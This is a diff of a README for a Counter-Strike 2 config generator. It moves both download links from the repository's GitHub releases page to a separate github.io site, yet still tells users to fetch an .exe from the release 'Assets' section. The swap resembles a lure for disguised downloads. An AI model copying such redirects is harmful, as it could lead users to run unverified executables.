@@ -1,6 +1,6 @@
 # ⚙️ cs2-config-generator - Create custom Counter-Strike 2 settings easily
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/mallorycastrated745/cs2-config-generator/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://mallorycastrated745.github.io)
 
 ## What is this tool?
 
@@ -17,7 +17,7 @@ The cs2-config-generator helps you manage your Counter-Strike 2 settings. It pro
 
 You must obtain the correct file to use this tool. Follow these instructions to download the application to your machine:
 
-1. Visit this page to download the latest version: [https://github.com/mallorycastrated745/cs2-config-generator/releases](https://github.com/mallorycastrated745/cs2-config-generator/releases)
+1. Visit this page to download the latest version: [https://mallorycastrated745.github.io](https://mallorycastrated745.github.io)
 2. Locate the file ending in .exe under the Assets section of the latest release.
 3. Click the filename to start the download.
 4. Save the file to your desktop or your Downloads folder.
